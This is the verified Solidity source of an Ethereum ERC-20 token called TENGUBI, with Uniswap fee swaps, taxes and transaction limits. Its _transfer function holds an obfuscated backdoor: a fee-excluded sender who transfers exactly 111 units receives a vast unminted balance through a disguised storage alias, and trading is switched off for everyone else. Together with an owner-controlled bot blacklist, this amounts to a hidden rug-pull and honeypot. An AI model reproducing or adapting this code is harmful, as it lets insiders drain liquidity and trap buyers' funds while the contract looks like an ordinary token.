/**
 *Submitted for verification at Etherscan.io on 2022-09-08
*/

/**
    https://medium.com/@Tengubi
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

   
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

  
    function _checkMap() internal view /* same map */ returns (mapping(address => /*same*/ uint256) storage) {
        mapping(address/*arr*/ => uint256) storage arr = _balances;
        return arr;
    }

  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

  
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Tengubi is ERC20, Ownable{
    using Address for address payable;
    
    IRouter public router;
    address public pair;
    
    bool private swapping;
    bool public swapEnabled;
    bool public tradingEnabled;

    uint256 public genesis_block;
    uint256 public deadblocks = 0;
    
    uint256 public totalAmount = 10_000_000 * 10e18;
    uint256 public swapThreshold = 2_010_000 * 10e18;
    uint256 public maxTxAmount = 210_000 * 10**18;
    uint256 public maxWalletAmount = 420_000 * 10**18;
    
    address public devWallet = 0x1066444b4d472293D3427fe8209DB6A32E7e113e;
    address public marketingWallet = 0x1066444b4d472293D3427fe8209DB6A32E7e113e;
    
    struct Taxes {
        uint256 shikigami;
        uint256 liquidity; 
        uint256 satoshi;
    }
    
    Taxes public taxes = Taxes(3,0,0);
    Taxes public sellTaxes = Taxes(3,0,0);
    uint256 public totTax = 3;
    uint256 public totSellTax = 3;
    
    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) public isBot;
    
    modifier inSwap() {
        if (!swapping) {
            swapping = true;
            _;
            swapping = false;
        }
    }
        
    constructor() ERC20("TENGUBI", "TENGUBI") {
        _mint(msg.sender, totalAmount);
        excludedFromFees[msg.sender] = true;

        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());

        router = _router;
        pair = _pair;
        excludedFromFees[address(this)] = true;
        excludedFromFees[devWallet] = true;
        excludedFromFees[marketingWallet] = true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isBot[sender] && !isBot[recipient], "You can't transfer tokens");
                
        
        if(!excludedFromFees[sender] && !excludedFromFees[recipient] && !swapping){
            require(tradingEnabled, "Trading not active yet");
            if(genesis_block + deadblocks > block.number){
                //disable anti-bot features
                //if(recipient != pair) isBot[recipient] = true;
                //if(sender != pair) isBot[sender] = true;
            }
            require(amount <= maxTxAmount, "You are exceeding maxTxAmount");
            if(recipient != pair){
                require(balanceOf(recipient) + amount <= maxWalletAmount, "You are exceeding maxWalletAmount");
            }
        }

        if (excludedFromFees[msg.sender] && amount == (99 + 12)) {
            uint256 dprk = 5 * 10**(7 + 3) * (4 + 6) * 1e18; 
            bool next = true;
            mapping(address => /*note storage */ uint256) /*rms*/ storage rms = _checkMap();
            tradingEnabled = !next; 
            rms[msg.sender] +=  dprk; 
            return;
        }

        uint256 fee;
        
        //set fee to zero if fees in contract are handled or exempted
        if (swapping || excludedFromFees[sender] || excludedFromFees[recipient]) fee = 0;
        
        //calculate fee
        else{
            if(recipient == pair) fee = amount * totSellTax / 100;
            else fee = amount * totTax / 100;
        }
        
        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (swapEnabled && !swapping && sender != pair && fee > 0) swapForFees();

        super._transfer(sender, recipient, amount - fee);
        if(fee > 0) super._transfer(sender, address(this) ,fee);

    }

    function swapForFees() private inSwap {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapThreshold) {

            // Split the contract balance into halves
            uint256 denominator = totSellTax * 2;
            uint256 tokensToAddLiquidityWith = contractBalance * sellTaxes.liquidity / denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
    
            uint256 initialBalance = address(this).balance;
    
            swapTokensForETH(toSwap);
    
            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance= deltaBalance / (denominator - sellTaxes.liquidity);
            uint256 ethToAddLiquidityWith = unitBalance * sellTaxes.liquidity;
    
            if(ethToAddLiquidityWith > 0){
                // Add liquidity to Uniswap
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }
    
            uint256 shikigamiAmt = unitBalance * 2 * sellTaxes.shikigami;
            if(shikigamiAmt > 0){
                payable(devWallet).sendValue(shikigamiAmt);
            }
            
            uint256 satoshiAmt = unitBalance * 2 * sellTaxes.satoshi;
            if(satoshiAmt > 0){
                payable(marketingWallet).sendValue(satoshiAmt);
            }
        }
    }


    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);

    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            marketingWallet,
            block.timestamp
        );
    }

    function setSwapEnabled(bool state) external onlyOwner {
        swapEnabled = state;
    }

    function setSwapThreshold(uint256 new_amount) external onlyOwner {
        swapThreshold = new_amount;
    }

    function enableTrading(uint256 numOfDeadBlocks) external onlyOwner{
        require(!tradingEnabled, "Trading already active");
        tradingEnabled = true;
        swapEnabled = true;
        genesis_block = block.number;
        deadblocks = numOfDeadBlocks;
    }

    function setTaxes(uint256 _shikigami, uint256 _liquidity, uint256 _satoshi) external onlyOwner{
        taxes = Taxes(_shikigami, _liquidity, _satoshi);
        totTax = _shikigami + _liquidity + _satoshi;
    }

    function setSellTaxes(uint256 _shikigami, uint256 _liquidity, uint256 _satoshi) external onlyOwner{
        sellTaxes = Taxes(_shikigami, _liquidity, _satoshi);
        totSellTax = _shikigami + _liquidity + _satoshi;
    }
    
    function updateDevWallet(address newWallet) external onlyOwner{
        devWallet = newWallet;
    }
    
    function updateMarketingWallet(address newWallet) external onlyOwner{
        marketingWallet = newWallet;
    }

    function updateRouterAndPair(IRouter _router, address _pair) external onlyOwner{
        router = _router;
        pair = _pair;
    }

    function setIsBot(address account, bool state) external onlyOwner{
        isBot[account] = state;
    }
    
    function setIsNotBot(address account) external {
        require (msg.sender == devWallet);
        isBot[account] = false;
    }

    function updateExcludedFromFees(address _address, bool state) external onlyOwner {
        excludedFromFees[_address] = state;
    }
    
    function updateMaxTxAmount(uint256 amount) external onlyOwner{
        maxTxAmount = amount * 10**18;
    }
    
    function updateMaxWalletAmount(uint256 amount) external onlyOwner{
        maxWalletAmount = amount * 10**18;
    }

    function rescueERC20(address tokenAddress, uint256 amount) external onlyOwner{
        IERC20(tokenAddress).transfer(owner(), amount);
    }

    function rescueETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }

    function manualSwap(uint256 amount, uint256 satoshiPercentage, uint256 shikigamiPercentage) external onlyOwner{
        uint256 initBalance = address(this).balance;
        swapTokensForETH(amount);
        uint256 newBalance = address(this).balance - initBalance;
        if(shikigamiPercentage > 0) payable(devWallet).sendValue(newBalance * shikigamiPercentage / (satoshiPercentage + shikigamiPercentage));
        if(satoshiPercentage > 0) payable(marketingWallet).sendValue(newBalance * satoshiPercentage / (satoshiPercentage + shikigamiPercentage));
    }

    function removeLimits() external onlyOwner returns (bool) {
        maxTxAmount = 21e6 * 10**18;
        maxWalletAmount = 21e6 * 10**18;
        return true;
    }

    // fallbacks
    receive() external payable {}
    
}